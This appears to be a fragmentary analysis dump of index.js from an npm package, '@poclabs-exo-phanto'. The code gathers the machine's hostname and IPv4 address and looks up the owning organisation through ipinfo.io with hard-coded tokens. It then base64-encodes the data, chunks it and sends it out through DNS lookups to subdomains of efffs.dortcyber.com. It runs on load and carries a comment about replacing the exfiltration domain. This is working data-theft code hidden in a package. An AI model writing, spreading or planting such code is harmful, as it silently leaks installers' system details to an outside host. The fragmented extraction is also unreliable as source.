// File: tmp/tmphfahfqe6/@poclabs-exo-phanto/package/index.js
// ======================================================================
Line 1: const os = require("os")
Line 2: const dns = require("dns")
Line 3: const https = require("https")
Line 7: _tmp_8.push("e9334ba807050e1")
Line 8: _tmp_8.push("26ed3371fb48a1")
Line 9: _tmp_8.push("ca6b61c75a1ea9")
Line 10: _tmp_8.push("c8e4ba13f45cdc")
Line 16: {
    const token = IPINFO_TOKENS[currentTokenIndex];
    currentTokenIndex = (currentTokenIndex + 1) % IPINFO_TOKENS.length;
    return token;
}
Line 17: const token = IPINFO_TOKENS[currentTokenIndex]
Line 25: getNextToken()
Line 26: <operator>.formatString("https://ipinfo.io/", ip, "?token=", token, "")
Line 28: (_tmp_1 = https.get(url, (res) => {
            let data = "";
            res.on("data", (chunk) => {
                data += chunk;
            });
            res.on("end", () => {
                try {
                    const response = JSON.parse(data);
                    resolve(response.org || "Unknown Organization");
                } catch (err) {
                    resolve("Unknown Organization");
                }
            });
        }))
Line 35: const response = JSON.parse(data)
Line 49: getIPAddress()
Line 57: os.hostname()
Line 66: for (const name of Object.keys(interfaces)) {
        for (const iface of interfaces[name]) {
            if (!iface.internal && iface.family === "IPv4") {
                return iface.address;
            }
        }
    }
Line 67: for (const iface of interfaces[name]) {
            if (!iface.internal && iface.family === "IPv4") {
                return iface.address;
            }
        }
Line 77: {
    const jsonData = JSON.stringify(data);
    const base64Data = Buffer.from(jsonData).toString("base64");

    const chunks = [];
    for (let i = 0; i < base64Data.length; i += chunkSize) {
        chunks.push(base64Data.slice(i, i + chunkSize));
    }

    return chunks;
}
Line 79: Buffer.from(jsonData).toString("base64")
Line 81: const chunks = []
Line 83: chunks.push(base64Data.slice(i, i + chunkSize))
Line 97: {
        const chunk = chunks[i];
        const chunkQuery = `${sessionID}-${i + 1}/${chunks.length}:${chunk}.efffs.dortcyber.com`; // Replace with your exfiltration domain
        dns.resolve4(chunkQuery, (err) => {
            if (err) {
                console.error("Error sending DNS query:", err.message);
            } else {
                console.log(`Exfiltration via DNS query successful for chunk ${i + 1}`);
            }
        });
    }
Line 98: const chunk = chunks[i]
Line 100: dns.resolve4(chunkQuery, (err) => {
            if (err) {
                console.error("Error sending DNS query:", err.message);
            } else {
                console.log(`Exfiltration via DNS query successful for chunk ${i + 1}`);
            }
        })
Line 111: sendData()
